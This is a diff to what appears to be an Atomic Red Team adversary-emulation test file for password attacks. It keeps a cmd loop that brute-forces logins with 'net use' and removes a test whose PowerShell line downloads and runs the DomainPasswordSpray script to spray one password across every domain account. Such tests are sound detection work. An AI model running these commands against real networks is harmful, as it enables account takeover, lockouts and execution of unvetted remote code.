@@ -31,24 +31,3 @@ atomic_tests:
       echo "1q2w3e4r" >> #{input_file_passwords}
       echo "Password!" >> #{input_file_passwords}
       @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-
-- name: Password Spray (DomainPasswordSpray)
-  description: |
-    Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
-    
-    https://github.com/dafthack/DomainPasswordSpray
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    domain:
-      description: Domain to brute force against
-      type: String
-      default: (Get-ADDomain | Select-Object -ExpandProperty Name)
-    
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
